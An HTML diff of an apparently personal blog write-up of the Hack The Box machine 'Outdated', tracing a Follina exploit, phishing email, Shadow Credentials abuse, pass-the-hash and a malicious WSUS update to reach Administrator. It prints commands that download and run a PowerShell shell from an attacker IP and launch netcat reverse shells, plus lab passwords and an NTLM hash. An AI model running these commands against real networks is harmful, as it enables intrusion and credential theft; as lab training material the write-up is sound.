@@ -1,1 +1,161 @@
-<html><head><meta charset="utf-8"></head><body><figure class="image"><img style="aspect-ratio:1365/185;" src="../img/posts/2024-10-04-Outdated(HTB)/01-1111f7cd1c.png" width="1365" height="185"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as btables</u></strong></span></p><p>&nbsp;</p><p>Enum4Linux</p><p>Domain Information via RPC for 10.10.11.175 &nbsp; &nbsp;|<br>===================================================<br>[+] Domain: OUTDATED<br>[+] Domain SID: S-1-5-21-4089647348-67660539-4016542185<br>[+] Membership: domain member<br>&nbsp;</p><p>We can connect to smb anonymously and download a pdf file containing a few CVEs that they “need to patch”<br><br>CVE-2022-30190<br>CVE ID<br>Type<br>Exec CodePublish Date<br>2022-06-01Score<br>9.3Access<br>RemoteComplexity<br>Medium<br>Description<br>Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code<br>Execution Vulnerability.<br>Windows Print Spooler Elevation of Privilege Vulnerability.<br>CVE-2022-30138 Exec Code2022-05-187.2LocalLow CVE-2022-30129 Exec Code 2022-05-106.8RemoteMediumVisual Studio Code Remote Code Execution Vulnerability.<br>CVE-2022-29130Exec Code<br>2022-05-109.3RemoteMediumWindows LDAP Remote Code Execution Vulnerability.<br>CVE-2022-29110Exec Code2022-05-109.3RemoteMediumMicrosoft Excel Remote Code Execution Vulnerability</p><p>&nbsp;</p><figure class="image"><img style="aspect-ratio:1620/752;" src="../img/posts/2024-10-04-Outdated(HTB)/02-b7240330c6.png" width="1620" height="752"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Using CVE 2022 30190 POC from john hammond</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>He has a reverse shell function that I could not get working. When specifying my own command I can get a shell. I did have to look up a hint for this part as the reverse shell would not work.</p><p>&nbsp;</p><p><code>python3 follina.py -c "IEX(IWR http://10.10.14.8:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 443" -i tun0 -p 80</code></p><p>&nbsp;</p><p>Then send the email</p><p><code>swaks --to itsupport@outdated.htb --from "0xdf@0xdf.htb" --header "Subject: Internal web app" --body "http://10.10.14.8/index.html"</code></p><figure class="image"><img style="aspect-ratio:1264/159;" src="../img/posts/2024-10-04-Outdated(HTB)/03-e5639bfaac.png" width="1264" height="159"></figure><p>&nbsp;</p><p>We get a shell</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:708/151;" src="../img/posts/2024-10-04-Outdated(HTB)/04-be97495603.png" width="708" height="151"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Finding btable's password in a check mail script.</p><p>&nbsp;</p><p>type check_mail.ps1</p><p><br>$user = 'btables@outdated.htb'<br>$pass = 'GHKKb7GEHcccdCT8tQV2QwL3'<br>&nbsp;</p><p><br>btables:GHKKb7GEHcccdCT8tQV2QwL3</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Sflowers</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>IPs found</p><p>172.16.20.20 - us</p><p>172.16.20.1 - dc</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:574/377;" src="../img/posts/2024-10-04-Outdated(HTB)/05-7ce9207673.png" width="574" height="377"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We can exploit AddKeyCredentialLink with the Sflowers user</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2546/978;" src="../img/posts/2024-10-04-Outdated(HTB)/06-be79a21542.png" width="2546" height="978"></figure><p>&nbsp;</p><p>&nbsp;</p><p>This command shows us a certificate we can use to request for a TGT but i learned this cannot be used in a full ConPtyShell no matter how many times I tried rubeus would give an error, switching to a normal NC shell worked right away.</p><p><code>.\Whisker.exe add /target:SFLOWERS</code></p><p>&nbsp;</p><p><code>.\Rubeus.exe asktgt /user:SFLOWERS /certificate:</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1819/1316;" src="../img/posts/2024-10-04-Outdated(HTB)/07-5321903f1a.png" width="1819" height="1316"></figure><p>ntlm for sflowers</p><p>1FCDB1F6015DCB318CC77BB2BDA14DB5<br>&nbsp;</p><p>&nbsp;</p><p>We can now remote in and get the user flag</p><p><code>evil-winrm -i 10.10.11.175 -u SFLOWERS -H 1FCDB1F6015DCB318CC77BB2BDA14DB5</code></p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Administrator</u></strong></span></p><p>&nbsp;</p><p>We are WSUS administrators which is new to me</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:586/116;" src="../img/posts/2024-10-04-Outdated(HTB)/08-e545f92df3.png" width="586" height="116"></figure><p>&nbsp;</p><p>Winpeas shows this as well</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:730/101;" src="../img/posts/2024-10-04-Outdated(HTB)/09-e272594423.png" width="730" height="101"></figure><p>&nbsp;</p><p>We can use this tool to exploit this</p><p>https://github.com/nettitude/SharpWSUS</p><p>&nbsp;</p><p>&nbsp;</p><p>First we create a fake windows update</p><p><code>.\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:" -accepteula -s -d c:\programdata\nc.exe -e cmd.exe 10.10.14.8 443" /title:"CVE-2022-30190"</code></p><p>&nbsp;</p><p>Then approve the update and wait for it to install which gives us a shell</p><p><code>.\SharpWSUS.exe approve /updateid:18fcb935-b2e3-4c1d-a2bd-b977a35784cb /computername:DC.outdated.htb /groupname:"Gr</code><br><code>oup Name"</code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:521/342;" src="../img/posts/2024-10-04-Outdated(HTB)/10-3fcba24ce5.png" width="521" height="342"></figure><p>&nbsp;</p><p>&nbsp;</p><p>All POCs showed adding a user to the machine rather than using netcat and no matter how many times i tried it would not add a user to the admins group. I also tried using a shell with msfvenom but that also failed. For whatever reason only netcat worked. This machine is rated medium but is probably one of the hardest machines ive done.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:700/636;" src="../img/posts/2024-10-04-Outdated(HTB)/11-35b20ab96a.png" width="700" height="636"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Outdated | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-10-04-Outdated(HTB)/01-1111f7cd1c.png" alt="HTB: Outdated cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Outdated</h1>
+                <div class="post-meta">October 4, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <img alt="Screenshot 1" height="185" src="../img/posts/2024-10-04-Outdated(HTB)/01-1111f7cd1c.png" style="aspect-ratio:1365/185;" width="1365"/>
+
+        <h1 style="color:red;">Shell as btables</h1>
+
+        <p>Enum4Linux</p>
+
+        <p>Domain Information via RPC for 10.10.11.175    |<br/>===================================================<br/>[+] Domain: OUTDATED<br/>[+] Domain SID: S-1-5-21-4089647348-67660539-4016542185<br/>[+] Membership: domain member<br/> </p>
+
+        <p>We can connect to smb anonymously and download a pdf file containing a few CVEs that they “need to patch”<br/><br/>CVE-2022-30190<br/>CVE ID<br/>Type<br/>Exec CodePublish Date<br/>2022-06-01Score<br/>9.3Access<br/>RemoteComplexity<br/>Medium<br/>Description<br/>Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code<br/>Execution Vulnerability.<br/>Windows Print Spooler Elevation of Privilege Vulnerability.<br/>CVE-2022-30138 Exec Code2022-05-187.2LocalLow CVE-2022-30129 Exec Code 2022-05-106.8RemoteMediumVisual Studio Code Remote Code Execution Vulnerability.<br/>CVE-2022-29130Exec Code<br/>2022-05-109.3RemoteMediumWindows LDAP Remote Code Execution Vulnerability.<br/>CVE-2022-29110Exec Code2022-05-109.3RemoteMediumMicrosoft Excel Remote Code Execution Vulnerability</p>
+
+        <img alt="Screenshot 2" height="752" src="../img/posts/2024-10-04-Outdated(HTB)/02-b7240330c6.png" style="aspect-ratio:1620/752;" width="1620"/>
+
+        <p>Using CVE 2022 30190 POC from john hammond</p>
+
+        <p>He has a reverse shell function that I could not get working. When specifying my own command I can get a shell. I did have to look up a hint for this part as the reverse shell would not work.</p>
+
+        <pre class="terminal"><code>python3 follina.py -c "IEX(IWR http://10.10.14.8:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 443" -i tun0 -p 80</code></pre>
+
+        <p>Then send the email</p>
+
+        <pre class="terminal"><code>swaks --to itsupport@outdated.htb --from "0xdf@0xdf.htb" --header "Subject: Internal web app" --body "http://10.10.14.8/index.html"</code></pre>
+
+        <img alt="Screenshot 3" height="159" src="../img/posts/2024-10-04-Outdated(HTB)/03-e5639bfaac.png" style="aspect-ratio:1264/159;" width="1264"/>
+
+        <p>We get a shell</p>
+
+        <img alt="Screenshot 4" height="151" src="../img/posts/2024-10-04-Outdated(HTB)/04-be97495603.png" style="aspect-ratio:708/151;" width="708"/>
+
+        <p>Finding btable's password in a check mail script.</p>
+
+        <p>type check_mail.ps1</p>
+
+        <p><br/>$user = 'btables@outdated.htb'<br/>$pass = 'GHKKb7GEHcccdCT8tQV2QwL3'<br/> </p>
+
+        <p><br/>btables:GHKKb7GEHcccdCT8tQV2QwL3</p>
+
+        <h1 style="color:red;">Shell as Sflowers</h1>
+
+        <p>IPs found</p>
+
+        <p>172.16.20.20 - us</p>
+
+        <p>172.16.20.1 - dc</p>
+
+        <img alt="Screenshot 5" height="377" src="../img/posts/2024-10-04-Outdated(HTB)/05-7ce9207673.png" style="aspect-ratio:574/377;" width="574"/>
+
+        <p>We can exploit AddKeyCredentialLink with the Sflowers user</p>
+
+        <img alt="Screenshot 6" height="978" src="../img/posts/2024-10-04-Outdated(HTB)/06-be79a21542.png" style="aspect-ratio:2546/978;" width="2546"/>
+
+        <p>This command shows us a certificate we can use to request for a TGT but i learned this cannot be used in a full ConPtyShell no matter how many times I tried rubeus would give an error, switching to a normal NC shell worked right away.</p>
+
+        <pre class="terminal"><code>.\Whisker.exe add /target:SFLOWERS</code></pre>
+
+        <pre class="terminal"><code>.\Rubeus.exe asktgt /user:SFLOWERS /certificate:</code></pre>
+
+        <img alt="Screenshot 7" height="1316" src="../img/posts/2024-10-04-Outdated(HTB)/07-5321903f1a.png" style="aspect-ratio:1819/1316;" width="1819"/>
+
+        <p>ntlm for sflowers</p>
+
+        <p>1FCDB1F6015DCB318CC77BB2BDA14DB5<br/> </p>
+
+        <p>We can now remote in and get the user flag</p>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.11.175 -u SFLOWERS -H 1FCDB1F6015DCB318CC77BB2BDA14DB5</code></pre>
+
+        <h1 style="color:red;">Shell as Administrator</h1>
+
+        <p>We are WSUS administrators which is new to me</p>
+
+        <img alt="Screenshot 8" height="116" src="../img/posts/2024-10-04-Outdated(HTB)/08-e545f92df3.png" style="aspect-ratio:586/116;" width="586"/>
+
+        <p>Winpeas shows this as well</p>
+
+        <img alt="Screenshot 9" height="101" src="../img/posts/2024-10-04-Outdated(HTB)/09-e272594423.png" style="aspect-ratio:730/101;" width="730"/>
+
+        <p>We can use this tool to exploit this</p>
+
+        <p>https://github.com/nettitude/SharpWSUS</p>
+
+        <p>First we create a fake windows update</p>
+
+        <pre class="terminal"><code>.\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:" -accepteula -s -d c:\programdata\nc.exe -e cmd.exe 10.10.14.8 443" /title:"CVE-2022-30190"</code></pre>
+
+        <p>Then approve the update and wait for it to install which gives us a shell</p>
+
+        <p><code>.\SharpWSUS.exe approve /updateid:18fcb935-b2e3-4c1d-a2bd-b977a35784cb /computername:DC.outdated.htb /groupname:"Gr</code><br/><code>oup Name"</code></p>
+
+        <img alt="Screenshot 10" height="342" src="../img/posts/2024-10-04-Outdated(HTB)/10-3fcba24ce5.png" style="aspect-ratio:521/342;" width="521"/>
+
+        <p>All POCs showed adding a user to the machine rather than using netcat and no matter how many times i tried it would not add a user to the admins group. I also tried using a shell with msfvenom but that also failed. For whatever reason only netcat worked. This machine is rated medium but is probably one of the hardest machines ive done.</p>
+
+        <img alt="Screenshot 11" height="636" src="../img/posts/2024-10-04-Outdated(HTB)/11-35b20ab96a.png" style="aspect-ratio:700/636;" width="700"/>
+    </article>
+
+</body>
+</html>
